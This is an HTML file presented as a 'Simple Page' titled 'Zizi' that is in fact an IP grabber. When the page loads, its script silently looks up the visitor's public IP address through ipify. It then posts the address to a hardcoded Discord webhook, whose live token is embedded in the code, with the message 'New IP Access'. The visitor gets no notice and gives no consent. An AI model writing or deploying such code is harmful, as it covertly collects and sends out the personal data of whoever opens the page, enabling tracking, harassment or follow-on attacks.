<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
    </style>
</head>
<body>
    <h1>Zizi</h1>

    <!-- Optionally you can add a confirmation message for the user -->
    <div id="confirmation-message"></div>

    <script>
        // Use ipify to get the public IP address
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                // Prepare data to send to the webhook
                const webhookUrl = 'https://discord.com/api/webhooks/1303064241493901362/RTkY6pfhx86k_MqS7RRaOeA5Emruv3CFsLQ7DEVEkTP6VPKMCyWGaqe_NJmG1_5SuFiY ';  // Replace with your actual Discord webhook URL
                const payload = {
                    content: `New IP Access:\nIP Address: ${data.ip}`
                };

                // Send the IP to the Discord Webhook
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        console.log("IP sent to webhook successfully!");
                        document.getElementById('confirmation-message').innerHTML = "caca.";
                    } else {
                        console.error("Error sending IP to webhook:", response.statusText);
                        document.getElementById('confirmation-message').innerHTML = "Error recording IP.";
                    }
                })
                .catch(error => {
                    console.error("Error sending IP to webhook:", error);
                    document.getElementById('confirmation-message').innerHTML = "Error recording IP.";
                });
            })
            .catch(error => {
                console.error('Error fetching IP information:', error);
                document.getElementById('confirmation-message').innerHTML = 'Unable to retrieve IP information.';
            });
    </script>
</body>
</html>
